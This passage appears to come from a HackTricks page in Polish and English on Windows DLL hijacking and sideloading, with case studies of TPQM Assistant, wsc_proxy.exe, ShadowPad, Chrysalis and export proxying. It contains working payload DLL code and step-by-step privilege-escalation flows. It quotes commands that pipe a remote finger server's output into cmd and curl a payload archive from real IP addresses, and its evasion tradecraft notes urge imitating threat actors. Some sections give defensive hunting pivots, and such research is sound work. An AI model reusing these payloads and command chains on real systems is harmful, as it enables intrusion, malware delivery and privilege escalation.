- **Uprawnienia katalogu**: Zapisywalny przez `CREATOR OWNER`, co pozwala local users wrzucić arbitralne pliki.
- **Zachowanie DLL Search**: Najpierw próbuje załadować `hostfxr.dll` z własnego working directory i loguje "NAME NOT FOUND", jeśli go brakuje, co wskazuje na lokalny priorytet wyszukiwania w katalogu.

### Implementacja exploita

Atakujący może umieścić złośliwy stub `hostfxr.dll` w tym samym katalogu, wykorzystując brakujący DLL, aby uzyskać code execution w kontekście użytkownika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Jako standardowy user wrzuć `hostfxr.dll` do `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż scheduled task uruchomi się o 9:30 AM w kontekście bieżącego usera.
3. Jeśli w momencie wykonania taska zalogowany jest administrator, malicious DLL uruchomi się w sesji administratora z medium integrity.
4. Połącz standardowe techniki UAC bypass, aby podnieść uprawnienia z medium integrity do uprawnień SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors często łączą MSI-based droppers z DLL side-loading, aby wykonać payload pod zaufanym, signed procesem.

Chain overview
- User pobiera MSI. CustomAction uruchamia się cicho podczas instalacji GUI (np. LaunchApplication albo akcja VBScript), odtwarzając next stage z osadzonych resources.
- Dropper zapisuje legalny, signed EXE i malicious DLL do tego samego katalogu (przykładowa para: Avast-signed wsc_proxy.exe + kontrolowany przez attacker wsc.dll).
- Gdy signed EXE zostaje uruchomiony, Windows DLL search order ładuje najpierw wsc.dll z working directory, wykonując code attacker pod signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Szukaj wpisów, które uruchamiają executables albo VBScript. Przykładowy suspicious pattern: LaunchApplication uruchamiający osadzony plik w tle.
- W Orca (Microsoft Orca.exe) sprawdź CustomAction, InstallExecuteSequence i Binary tables.
- Embedded/split payloads w MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Albo użyj lessmsi: lessmsi x package.msi C:\out
- Szukaj wielu małych fragmentów, które są łączone i decryptowane przez VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktyczny sideloading z wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
- wsc_proxy.exe: legalny podpisany host (Avast). Proces próbuje załadować wsc.dll po nazwie ze swojego katalogu.
- wsc.dll: DLL atakującego. Jeśli nie są wymagane konkretne eksporty, wystarczy DllMain; w przeciwnym razie zbuduj proxy DLL i przekazuj wymagane eksporty do oryginalnej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny payload DLL:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Do wymagań export, użyj proxying framework (np. DLLirant/Spartacus), aby wygenerować forwarding DLL, która dodatkowo wykonuje twój payload.

- Ta technika opiera się na resolution nazw DLL przez host binary. Jeśli host używa absolute paths albo safe loading flags (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie powieść.
- KnownDLLs, SxS i forwarded exports mogą wpływać na precedence i trzeba je uwzględnić przy wyborze host binary i export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point opisał, jak Ink Dragon wdraża ShadowPad, używając **three-file triad**, aby wtopić się w legitimate software, jednocześnie trzymając core payload zaszyfrowany na dysku:

1. **Signed host EXE** – nadużywane są vendorzy tacy jak AMD, Realtek lub NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Atakujący zmieniają nazwę pliku wykonywalnego, aby wyglądał jak Windows binary (na przykład `conhost.exe`), ale podpis Authenticode pozostaje prawidłowy.
2. **Malicious loader DLL** – wrzucany obok EXE pod oczekiwaną nazwą (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL jest zwykle binarką MFC obfuskowaną frameworkiem ScatterBrain; jej jedynym zadaniem jest znaleźć zaszyfrowany blob, odszyfrować go i reflectively map ShadowPad.
3. **Encrypted payload blob** – często przechowywany jako `<name>.tmp` w tym samym katalogu. Po memory-mapping odszyfrowanego payload loader usuwa plik TMP, aby zniszczyć forensic evidence.

Tradecraft notes:

* Zmiana nazwy signed EXE (przy zachowaniu oryginalnego `OriginalFileName` w PE header) pozwala mu udawać Windows binary, a jednocześnie zachować podpis vendora, więc warto naśladować zwyczaj Ink Dragon polegający na wrzucaniu plików wyglądających jak `conhost.exe`, które w rzeczywistości są narzędziami AMD/NVIDIA.
* Ponieważ executable pozostaje trusted, większość allowlisting controls wymaga jedynie, aby twój malicious DLL leżał obok niego. Skup się na dostosowaniu loader DLL; signed parent zwykle może działać bez zmian.
* Decryptor ShadowPada oczekuje, że blob TMP będzie obok loadera i będzie writable, aby mógł wyzerować plik po mappingu. Utrzymuj katalog writable do momentu załadowania payloadu; po załadowaniu do pamięci plik TMP można bezpiecznie usunąć dla OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger finger → tar/curl → WMI)

Operatorzy łączą DLL sideloading z LOLBAS, tak aby jedynym custom artifact na dysku był malicious DLL obok trusted EXE:

- **Remote command loader (Finger):** Ukryty PowerShell uruchamia `cmd.exe /c`, pobiera polecenia z Finger server i przekazuje je do `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` pobiera TCP/79 text; `| cmd` wykonuje odpowiedź serwera, pozwalając operatorom rotować second stage po stronie serwera.

- **Built-in download/extract:** Pobierz archive z benign extension, rozpakuj go i umieść sideload target oraz DLL w losowym folderze `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` ukrywa postęp i podąża za redirects; `tar -xf` używa wbudowanego w Windows `tar`.

- **WMI/CIM launch:** Uruchom EXE przez WMI, aby telemetry pokazywała proces utworzony przez CIM, podczas gdy ładuje on współlokowany DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Działa z binarkami, które preferują local DLLs (np. `intelbq.exe`, `nearby_share.exe`); payload (np. Remcos) uruchamia się pod trusted name.

- **Hunting:** Alarmuj na `forfiles`, gdy `/p`, `/m` i `/c` pojawiają się razem; rzadkie poza admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Niedawna intruzja Lotus Blossom nadużyła trusted update chain, aby dostarczyć NSIS-packed dropper, który przygotował DLL sideload oraz fully in-memory payloads.

Tradecraft flow
- `update.exe` (NSIS) tworzy `%AppData%\Bluetooth`, oznacza go jako **HIDDEN**, wrzuca przemianowany Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` oraz zaszyfrowany blob `BluetoothService`, a następnie uruchamia EXE.
- Host EXE importuje `log.dll` i wywołuje `LogInit`/`LogWrite`. `LogInit` mmap-loaduje blob; `LogWrite` odszyfrowuje go przy użyciu niestandardowego stream opartego na LCG (stałe **0x19660D** / **0x3C6EF35F**, key material wyprowadzony z wcześniejszego hash), nadpisuje buffer plaintext shellcode, zwalnia temporaries i skacze do niego.
- Aby uniknąć IAT, loader rozwiązuje API przez hashowanie export names z użyciem **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, a następnie stosuje Murmur-style avalanche (**0x85EBCA6B**) i porównuje z salted target hashes.

Main shellcode (Chrysalis)
- Odszyfrowuje PE-like main module, powtarzając add/XOR/sub z kluczem `gQ2JR&9;` przez pięć pass, po czym dynamicznie ładuje `Kernel32.dll` → `GetProcAddress`, aby dokończyć import resolution.
- Odtwarza strings nazw DLL w runtime przez per-character bit-rotate/XOR transforms, po czym ładuje `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Używa drugiego resolvera, który przegląda **PEB → InMemoryOrderModuleList**, parsuje każdą export table w 4-byte blocks z Murmur-style mixing i wraca do `GetProcAddress` tylko wtedy, gdy hash nie zostanie znaleziony.

Embedded configuration & C2
- Konfiguracja znajduje się w wrzuconym pliku `BluetoothService` pod **offset 0x30808** (size **0x980**) i jest odszyfrowywana RC4 z kluczem `qwhvb^435h&*7`, ujawniając C2 URL i User-Agent.
- Beacony budują host profile rozdzielany kropkami, dodają tag `4Q`, a następnie szyfrują RC4 z kluczem `vAuig34%^325hGV` przed `HttpSendRequestA` przez HTTPS. Odpowiedzi są odszyfrowywane RC4 i dispatchowane przez tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Tryb execution jest kontrolowany przez CLI args: brak args = instalacja persistence (service/Run key) wskazująca na `-i`; `-i` ponownie uruchamia siebie z `-k`; `-k` pomija install i uruchamia payload.

Alternate loader observed
- Ta sama intruzja wrzuciła Tiny C Compiler i uruchomiła `svchost.exe -nostdlib -run conf.c` z `C:\ProgramData\USOShared\`, z `libtcc.dll` obok. Dostarczony przez atakującego C source zawierał shellcode, kompilował go i uruchamiał in-memory bez dotykania dysku plikiem PE. Odtwórz z:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ten etap compile-and-run oparty na TCC zaimportował `Wininet.dll` w czasie wykonania i pobrał shellcode drugiego etapu z hardcoded URL, dając elastyczny loader, który podszywa się pod uruchomienie kompilatora.

## Signed-host sideloading z export proxying + host thread parking

Niektóre łańcuchy DLL sideloading dodają **stability engineering**, aby legalny host pozostawał aktywny wystarczająco długo, by poprawnie załadować późniejsze etapy zamiast crashować po załadowaniu złośliwego DLL.

Zaobserwowany wzorzec
- Umieść zaufany EXE obok złośliwego DLL, używając oczekiwanej nazwy dependency, takiej jak `version.dll`.
- Złośliwy DLL **proxyuje każdy oczekiwany export** do rzeczywistego systemowego DLL (na przykład `%SystemRoot%\\System32\\version.dll`), więc import resolution nadal się powiodzie, a proces hosta dalej działa.
- Po załadowaniu złośliwy DLL **patchuje entry point hosta**, aby główny wątek wpadał w nieskończoną pętlę `Sleep` zamiast kończyć działanie albo uruchamiać ścieżki kodu, które zakończą proces.
- Nowy wątek wykonuje właściwą złośliwą pracę: odszyfrowuje nazwę lub path DLL następnego etapu (RC4/XOR są częste), a następnie uruchamia go przez `LoadLibrary`.

Dlaczego to ma znaczenie
- Zwykły DLL proxying zachowuje zgodność API, ale nie gwarantuje, że host pozostanie aktywny wystarczająco długo dla późniejszych etapów.
- Ustawienie głównego wątku w `Sleep(INFINITE)` to prosty sposób, aby utrzymać podpisany proces w pamięci, podczas gdy loader wykonuje odszyfrowanie, staging albo bootstrap sieciowy w wątku roboczym.
- Szukanie tylko podejrzanego `DllMain` może pominąć ten wzorzec, jeśli interesujące zachowanie następuje dopiero po spatchowaniu entry point hosta i uruchomieniu drugiego wątku.

Minimalny workflow
1. Skopiuj podpisany EXE hosta i ustal DLL, który rozwiązuje z lokalnego katalogu.
2. Zbuduj proxy DLL eksportujący te same funkcje i przekazujący je do legalnego DLL.
3. W `DllMain(DLL_PROCESS_ATTACH)` utwórz wątek roboczy.
4. Z tego wątku spatchuj entry point hosta albo główną procedurę startową wątku, aby zapętlała się na `Sleep`.
5. Odszyfruj nazwę/config DLL następnego etapu i wywołaj `LoadLibrary` albo manual-map payload.

Defensive pivots
- Podpisane procesy ładujące `version.dll` albo podobne, powszechne biblioteki z własnego katalogu aplikacji zamiast z `System32`.
- Patches pamięci na entry point procesu krótko po załadowaniu obrazu, zwłaszcza skoki/wywołania przekierowane do `Sleep`/`SleepEx`.
- Wątki tworzone przez proxy DLL, które natychmiast wywołują `LoadLibrary` na drugim DLL o odszyfrowanej nazwie.
- Full-export proxy DLL umieszczone obok vendor executables w zapisywalnych katalogach staging, takich jak `ProgramData`, `%TEMP%` albo ścieżki rozpakowanych archiwów.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
